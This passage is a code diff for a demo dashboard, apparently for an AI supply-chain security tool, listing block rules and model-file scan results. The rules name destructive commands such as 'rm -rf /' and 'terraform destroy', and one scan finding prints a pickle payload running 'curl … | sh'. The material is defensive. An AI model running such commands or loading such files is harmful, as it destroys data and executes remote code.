+    'Stops agents calling the Langflow endpoint that allowed unauthenticated code execution.', 'POST */api/v1/validate/code', 'critical', 'AML.T0011 · LLM05', []],
+  ['FEED-CMD-0102', 'destructive shell commands', 'Amazon Q wiper prompt', 'shell command', 'block', '0',
+    'Blocks commands that wipe files or infrastructure, like rm -rf / or terraform destroy.', 'rm -rf / | terraform destroy | aws .* delete', 'critical', 'AML.T0048 · ASI02', []],
+  ['FEED-PKG-0012', 'look-alike names of popular AI packages', 'internal list', 'package', 'block', '0',
+    'Blocks typosquatted packages such as “openal” or “langchian”.', 'pypi|npm: openal, langchian, transformerss, …', 'medium', 'AML.T0010 · LLM03', []]
+];
+const FILES = [
+  ['bielik-11b-v3.0-instruct.gguf', 'GGUF', 'passed', 'header and metadata OK', 'A standard GGUF model file. Nothing in it can run code when it is loaded.', 'GGUF v3 · 40 tensors groups · metadata within limits', '3d0a…91c2', 'today 08:10'],
+  ['corp-loan-memo-pl.gguf', 'GGUF', 'passed', 'our fine-tuned model', 'Our own fine-tuned model went through the same scan before it was registered.', 'GGUF v3 · LoRA merged · metadata within limits', '5b9e…77a0', '2 Oct 18:44'],
+  ['finetune-v2.bin', 'pickle', 'blocked', 'runs os.system when loaded', 'This file would run a shell command the moment someone loads it. Pickle files are blocked by default.', 'GLOBAL os.system\nREDUCE → os.system("curl http://… | sh")', 'a4f1…0c77', '1 Oct 10:12'],
+  ['adapter-weights.7z', '7z', 'blocked', '7z where ZIP was expected', 'The archive format does not match what a PyTorch file should be. A mismatch like this is treated as an attack, not as “could not scan”.', 'expected ZIP (PyTorch) · found 7z header 37 7A BC AF', '9e20…b511', '1 Oct 10:14'],
+  ['intent-classifier.keras', 'Keras', 'blocked', 'Lambda layer runs code', 'The model contains a Lambda layer, which can run arbitrary Python when loaded.', 'layer 7: Lambda(function=…) · module reference builtins.exec', '61c3…e8a2', '28 Sep 15:30']
+];
+
+class Component extends DCLogic {
+  constructor(props) {
+    super(props);
+    this.state = { menu: false, theme: null, tab: 'sig', sel: 0, fsel: 2, adding: false, added: false };
+  }
+  renderVals() {
+    const style = this.props.badgeStyle ?? 'tint';
+    const c = palette(this.state.theme ?? this.props.theme ?? 'dark', this.props.accent ?? '#4C8DFF');
+    const pad = (this.props.density ?? 'compact') === 'comfortable' ? '11px' : '8px';
+    const fgOf = (k) => (c.dark ? DEC[k].dk : DEC[k].lt);
+    const S = this.state;
+    const all = S.added ? [['FEED-PKG-0142', 'torchtriton — dependency-confusion package', 'added by you · demo', 'package', 'block', '0',
+      'Blocks installing the fake torchtriton package used in a dependency-confusion attack.', 'pypi: torchtriton (any version)', 'critical', 'AML.T0010 · LLM03', []]].concat(SIGS) : SIGS;
+    const sigs = all.map((s, i) => Object.assign({ id: s[0], what: s[1], src: s[2], type: s[3], b: chip(DEC, s[4], c, style), hits: s[5], pick: () => this.setState({ sel: i, adding: false }) }, rowSel(S.sel === i && !S.adding, c)));
+    const X = all[Math.max(0, Math.min(S.sel, all.length - 1))];
+    const s = {
+      id: X[0], about: X[6], pattern: X[7],
+      facts: [['Looks at', X[3]], ['Action', X[4]], ['Severity', X[8]], ['Tags', X[9]], ['Source', X[2]], ['Expires', 'never']].map(([k, v]) => ({ k: k, v: v })),
+      hitsList: X[10].map(([t, what]) => ({ t: t, what: what })), noHits: X[10].length === 0
+    };
+    const files = FILES.map((f, i) => {
+      const okf = f[2] === 'passed';
+      return Object.assign({ name: f[0], format: f[1], result: f[2], finding: f[3], fg: okf ? fgOf('allow') : fgOf('block'), d: okf ? DEC.allow.d : DEC.block.d, pick: () => this.setState({ fsel: i }) }, rowSel(S.fsel === i, c));
+    });
+    const F = FILES[Math.max(0, S.fsel)];
+    const fOk = F[2] === 'passed';
+    return Object.assign({
+      c: c, pad: pad,
+      nav: navFor('feed', c),
+      ok: fgOf('allow'),
+      feed: S.added ? { v: 'f-2026.10.03.5 · +1 rule', sync: 'just now' } : { v: 'f-2026.10.03.4', sync: '30 s ago' },
+      tabs: segVals([['sig', 'Signatures', String(all.length)], ['files', 'Model files', String(FILES.length)]], S.tab, c, (k) => this.setState({ tab: k })),
+      show: { sig: S.tab === 'sig', files: S.tab === 'files' },
+      sigs: sigs, s: s, files: files,
+      f: { name: F[0], result: F[2], about: F[4], detail: F[5], sha: F[6], when: F[7], fg: fOk ? fgOf('allow') : fgOf('block'), d: fOk ? DEC.allow.d : DEC.block.d },
+      sigDrawer: S.tab === 'sig' && S.sel >= 0 && !S.adding,
+      addDrawer: S.tab === 'sig' && !!S.adding,
+      fileDrawer: S.tab === 'files' && S.fsel >= 0,
+      close: () => this.setState(S.tab === 'files' ? { fsel: -1 } : { sel: -1, adding: false }),
+      openAdd: () => this.setState({ adding: true }),
+      addRule: () => this.setState({ added: true, adding: false, sel: 0 }),
+      form: [['Rule ID', 'FEED-PKG-0142'], ['Looks at', 'package'], ['Pattern', 'pypi: torchtriton (any version)'], ['Action', 'block']].map(([k, v]) => ({ k: k, v: v }))
+    }, menuVals(this, c));
+  }
+}
+</script>
+</body>
+</html>
